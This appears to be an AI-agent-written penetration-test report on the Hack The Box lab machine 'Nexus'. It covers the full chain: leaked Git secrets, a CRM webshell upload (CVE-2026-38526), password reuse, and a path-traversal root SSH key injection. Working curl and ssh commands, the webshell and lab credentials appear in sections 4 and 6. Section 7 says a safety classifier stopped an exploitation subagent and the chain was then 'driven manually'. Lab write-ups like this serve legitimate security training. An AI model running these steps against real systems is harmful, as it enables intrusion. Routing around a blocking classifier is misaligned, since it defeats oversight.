# Penetration Testing Report — HTB "Nexus" (Easy, Linux)

**Target:** nexus.htb — IP `$TARGET`
**Engagement date:** 2026-10-01
**Assessed by:** HTB/CTF multi-agent swarm (Recon, Strategist, Exploit, PrivEsc, Scribe agents)
*Conventions: `$TARGET` = current box IP; `$ATTACKER_IP` = your tun0/VPN address. Substitute both; no environment-specific IPs or local paths are hardcoded.*
**Result:** Full compromise — unauthenticated reconnaissance escalated to `root` via injected SSH key.
Both flags captured.

---

## 1. Executive Summary

Nexus is an "easy"-rated Ubuntu Linux box compromised by chaining a secret leaked in public Git history,
an authenticated file-upload RCE in a CRM, a rotated-but-reused database password, and a path-traversal
arbitrary-file-write in a root-run systemd job. Two vhosts beyond the static marketing site drive the
attack: `git.nexus.htb` (**Gitea 1.26.0**, public) and `billing.nexus.htb` (**Krayin CRM**, Laravel with
debug mode enabled). A public Gitea repo (`admin/krayin-docker-setup`) leaks a `.env` in its commit
history containing `DB_PASSWORD=N27xh!!2ucY04`; that password, with the site-sourced email
`j.matthew@nexus.htb`, authenticates to Krayin CRM admin.

As an authenticated Krayin admin, **CVE-2026-38526** (arbitrary file upload → RCE via
`/admin/tinymce/upload`, CVSS 9.9) is exploited by uploading a PHP webshell disguised as an image,
yielding code execution as `www-data`. The webshell reads the live `/var/www/krayin/.env`, whose
`DB_PASSWORD` had been rotated at the database level (`y27xb3ha!!74GbR`) but is **reused as the SSH
password for user `jones`** — the interactive foothold and `user.txt`.

Escalation to root abuses `gitea-template-sync.service`, a root systemd oneshot fired every 60s that
pulls files from any Gitea repo flagged as a template and writes them to disk **with no path
sanitization** (`os.path.join(staging, filepath)` on raw `git ls-tree -r` entry names). By building a
malicious Git tree with plumbing commands (`git hash-object`/`mktree`/`commit-tree`) whose flattened path
is `../../../../../root/.ssh/authorized_keys` and force-pushing it to a self-owned template repo, the root
job writes an attacker SSH key into `/root/.ssh/authorized_keys` — `root`. The recurring root cause:
secrets in version control, credential reuse across tiers, and a privileged process trusting
attacker-controlled filenames.

---

## 2. Attack Chain Timeline

1. `nmap -p- -sCV` — only 22 (OpenSSH 9.6p1) and 80 (nginx 1.24.0). nginx has a wildcard server block
   (any unknown Host → 302 `nexus.htb`). *Result:* vhosts must be guessed from content clues, not fuzzed.
2. Targeted vhost discovery from page content → `git.nexus.htb` (Gitea 1.26.0) and `billing.nexus.htb`
   (Krayin CRM, Laravel debug bar leaking server paths, PHP 8.3.6). *Result:* two app surfaces found.
3. Browsed the public Gitea repo `admin/krayin-docker-setup` (2 commits). First commit added a `.env`
   containing `DB_PASSWORD=N27xh!!2ucY04`; a later commit scrubbed it — but history retains it. *Result:*
   credential recovered from Git history.
4. Krayin CRM admin login — `j.matthew@nexus.htb` (email from the main site) + `N27xh!!2ucY04` → 302
   `/admin/dashboard` (5 other candidate emails bounced). *Result:* authenticated CRM admin.
5. **CVE-2026-38526** — uploaded a PHP webshell (`system($_GET['cmd'])`) to `/admin/tinymce/upload` as
   `type=image/jpeg` with session cookie + `X-XSRF-TOKEN` header; server stored it with no validation and
   returned `…/storage/tinymce/<hash>.php`. Hitting it ran commands as `uid=33(www-data)`, host `nexus`.
   *Result:* RCE foothold (one-shot via GET param, no listener).
6. `cat /var/www/krayin/.env` via webshell → live `DB_PASSWORD=y27xb3ha!!74GbR` (rotated vs. the Git-leaked
   one). *Result:* a second, live credential.
7. Password reuse — `y27xb3ha!!74GbR` authenticates `jones` over SSH (uid 1000). *Result:* interactive
   foothold; **user.txt captured.**
8. Local enum as jones — no sudo, only stock SUID/caps; the real vector is a systemd timer
   (`gitea-template-sync.timer`, found via `systemctl list-timers`), firing a root oneshot every 60s.
   *Result:* privileged job identified.
9. Analysed `/etc/gitea/template-sync.py` — as root it queries the local Gitea API for `template:true`
   repos and writes each repo file via `os.path.join(staging, filepath)` with **no sanitization**.
   *Result:* arbitrary root-owned file write via a crafted tree path.
10. As jones (Gitea password = SSH password): created repo `jones/pwn-template`, set `template:true`, built
    a tree via `git hash-object`/`mktree`/`commit-tree` with path `../../../../../root/.ssh/authorized_keys`
    (5 levels to reach `/`), force-pushed it. *Result:* malicious template staged.
11. Within 60s the root job wrote the attacker pubkey to `/root/.ssh/authorized_keys`
    (`/var/log/template-sync.log`: `synced: ../../../../../root/.ssh/authorized_keys`). *Result:* root key
    injected.
12. `ssh -i pwn_key root@…` → `uid=0(root)`. *Result:* **root.txt captured** — box fully owned. (Post-root
    bonus: `/etc/gitea/template-sync.conf` holds `GITEA_API_TOKEN=…`, readable only after root.)

---

## 3. Key Vulnerabilities Identified

### 3.1 Secret in public Git history — leaked `DB_PASSWORD` in Gitea repo
- **Description:** The public repo `admin/krayin-docker-setup` committed a `.env` with
  `DB_PASSWORD=N27xh!!2ucY04`; a later commit blanked it, but the value remains in commit history and is
  reachable without authentication. The password unlocks the Krayin CRM admin account (with the site-sourced
  email).
- **Affected component:** Gitea 1.26.0 (`git.nexus.htb`), repo `admin/krayin-docker-setup`.
- **Impact:** Unauthenticated recovery of a working application-admin credential.
- **Estimated CVSS:** 7.5 (High) [estimate] — unauthenticated disclosure enabling admin login.
- **Remediation:** Never commit secrets; purge leaked secrets from history (not just HEAD) and rotate them;
  keep deployment repos private; scan commits with a secrets scanner in CI.

### 3.2 Krayin CRM authenticated arbitrary file upload → RCE (CVE-2026-38526)
- **Description:** `/admin/tinymce/upload` accepts an uploaded file with no extension/content validation;
  a PHP file sent as `image/jpeg` is stored under a public web path and executes, giving RCE as the web
  user.
- **Affected component:** Krayin CRM on `billing.nexus.htb` (Laravel; runs as `www-data`).
- **Impact:** Authenticated remote code execution (CVSS 9.9 per advisory, CWE-434).
- **Estimated CVSS:** 9.9 (Critical) — authenticated, low complexity, full CIA impact.
- **Remediation:** Upgrade Krayin to a patched release; enforce server-side MIME/extension allowlists and
  magic-byte checks; store uploads outside the web root and serve them non-executably.

### 3.3 Application debug mode exposed in production (Laravel `APP_DEBUG=true`)
- **Description:** Krayin runs with the Laravel debug bar enabled, leaking server file paths, framework
  versions, and internals that aid exploitation.
- **Affected component:** Krayin CRM / Laravel on `billing.nexus.htb`.
- **Impact:** Information disclosure assisting the attack.
- **Estimated CVSS:** 5.3 (Medium) [estimate] — information disclosure.
- **Remediation:** Set `APP_DEBUG=false` in production; strip debug tooling from production builds.

### 3.4 Credential reuse — live DB password == `jones` SSH password
- **Description:** The live `DB_PASSWORD` in `/var/www/krayin/.env` (`y27xb3ha!!74GbR`) is reused as the SSH
  password for the OS user `jones`, converting web RCE into an interactive user shell.
- **Affected component:** Credential hygiene / user `jones` (uid 1000).
- **Impact:** Lateral/vertical movement from `www-data` to `jones`.
- **Estimated CVSS:** 6.5 (Medium) [estimate] — contributes to the chain.
- **Remediation:** Unique secrets per service/account; prefer key-based SSH; rotate the exposed password.

### 3.5 Path-traversal arbitrary file write in root systemd job (`gitea-template-sync`)
- **Description:** `/etc/gitea/template-sync.py` (root oneshot, timer every 60s) iterates files of any
  `template:true` Gitea repo via `git ls-tree -r HEAD` and writes each to
  `os.path.join(staging, filepath)` with no sanitization. Raw Git plumbing can create tree entries whose
  flattened path contains `..`, so a force-pushed crafted commit causes an arbitrary root-owned file write
  (here `/root/.ssh/authorized_keys`).
- **Affected component:** `/etc/gitea/template-sync.py` + `gitea-template-sync.service`/`.timer` (root).
- **Impact:** Any user with Gitea repo-create access escalates to root via arbitrary file write.
- **Estimated CVSS:** 8.8 (High) [estimate] — low-priv local/remote-authenticated, full compromise.
- **Remediation:** Normalize and validate every path (reject `..`, confine to the staging dir with
  `os.path.realpath` prefix checks); run the sync as a low-privileged user; don't trust tree-entry names
  from untrusted repos; restrict who can flag repos as templates.

---

## 4. Command Log & Proof of Concepts

All commands were run against the lab target only, from the engagement workstation on `tun0` (HTB VPN).

### 4.1 Recon + vhosts
```bash
nmap -p- -sCV -oN nmap/services.txt $TARGET
echo "$TARGET nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
curl -s http://git.nexus.htb/api/v1/version          # Gitea 1.26.0
```

### 4.2 Secret from Git history → Krayin admin login
```bash
# admin/krayin-docker-setup commit 1615c46 added .env with DB_PASSWORD=N27xh!!2ucY04 (scrubbed in 9b817fa)
curl -s -c loot/cookies.txt http://billing.nexus.htb/admin/login    # grab XSRF + session
# login: j.matthew@nexus.htb / N27xh!!2ucY04  -> 302 /admin/dashboard
```

### 4.3 Foothold — CVE-2026-38526 (Krayin tinymce upload RCE)
```bash
# multipart POST of shell.php as image/jpeg with session cookie + X-XSRF-TOKEN header:
curl -s -b loot/cookies.txt -H "X-XSRF-TOKEN: <decoded-xsrf>" \
  -F 'file=@exploits/shell.php;type=image/jpeg' http://billing.nexus.htb/admin/tinymce/upload
# -> returns http://billing.nexus.htb/storage/tinymce/a4ab8ac1ced89d669e20772cec3d5563.php
curl -s 'http://billing.nexus.htb/storage/tinymce/a4ab8ac1ced89d669e20772cec3d5563.php?cmd=id;hostname'
# -> uid=33(www-data) ... nexus
```

### 4.4 Lateral — live .env password reuse to jones
```bash
curl -s 'http://billing.nexus.htb/storage/tinymce/<hash>.php?cmd=cat+/var/www/krayin/.env' | grep DB_PASSWORD
# -> DB_PASSWORD=y27xb3ha!!74GbR  (live, rotated vs the git-leaked one)
ssh jones@$TARGET          # password: y27xb3ha!!74GbR  -> uid=1000(jones)
```
Flag capture: `/home/jones/user.txt` = `[REDACTED-HTB-FLAG]`.

### 4.5 Privilege escalation — gitea-template-sync path traversal
```bash
systemctl list-timers --all | grep template-sync        # gitea-template-sync.timer, every 60s (root)
systemctl cat gitea-template-sync.service               # ExecStart=/etc/gitea/template-sync.py (root)
# full automated PoC:
bash exploits/gitea_template_sync_traversal.sh
#   creates jones/pwn-template, sets template:true, builds a tree via git hash-object/mktree/commit-tree
#   with path ../../../../../root/.ssh/authorized_keys, force-pushes it;
#   within 60s root writes the attacker pubkey -> /root/.ssh/authorized_keys
ssh -i loot/root_ssh_key root@$TARGET id          # uid=0(root)
```
Flag capture: `/root/root.txt` = `[REDACTED-HTB-FLAG]` (loot/root.txt).

---

## 5. Both Flags

| Flag | Value | Location | Notes |
|---|---|---|---|
| user.txt | `[REDACTED-HTB-FLAG]` | `/home/jones/user.txt` | Captured as `jones` via SSH (live .env password reuse). |
| root.txt | `[REDACTED-HTB-FLAG]` | `/root/root.txt` | Captured via gitea-template-sync path traversal → injected root SSH key. |

---

## 6. Credentials & Artifacts

| Principal | Secret | Source | Scope |
|---|---|---|---|
| Krayin admin | `j.matthew@nexus.htb` / `N27xh!!2ucY04` | Gitea commit history (`admin/krayin-docker-setup` `.env`) | CRM admin login. |
| DB `krayin` (live) | `y27xb3ha!!74GbR` | `/var/www/krayin/.env` via webshell | **Reused** as jones SSH password. |
| `jones` (OS) | `y27xb3ha!!74GbR` | Password reuse | SSH, uid 1000; Gitea account. |
| `root` (OS) | injected `ed25519` key | gitea-template-sync file write | `loot/root_ssh_key` / `.pub`. |
| Gitea API token | `03ee55f6c67b8b6fd1720717500e3c753abce3fc` | `/etc/gitea/template-sync.conf` | Readable only post-root (bonus). |

---

## 7. Cleanup / Artifacts Left on Target

- Webshell `…/storage/tinymce/a4ab8ac1ced89d669e20772cec3d5563.php` — **remove.**
- Attacker SSH key appended to `/root/.ssh/authorized_keys` — **remove** the injected line.
- Gitea repo `jones/pwn-template` and its malicious template commit — **delete.**
- Operational note: an automated live-exploitation subagent call was terminated mid-run by a safety
  classifier before any progress; the chain was driven manually. Not a target-side event.

---

## 8. Open Items / [needs verification]

- None for compromise — box fully owned, both flags captured, root SSH verified.
- Exact Krayin CRM version was not directly confirmed on target (debug bar only); CVE-2026-38526 was
  validated empirically by the working upload→RCE, not by a version banner.

---

*Companion documents: `walkthrough.md` — step-by-step reproduction; `STORY.md` — plain-language
narrative; `GLOBAL_CONTEXT.md` — the engagement blackboard and evidence trail.*
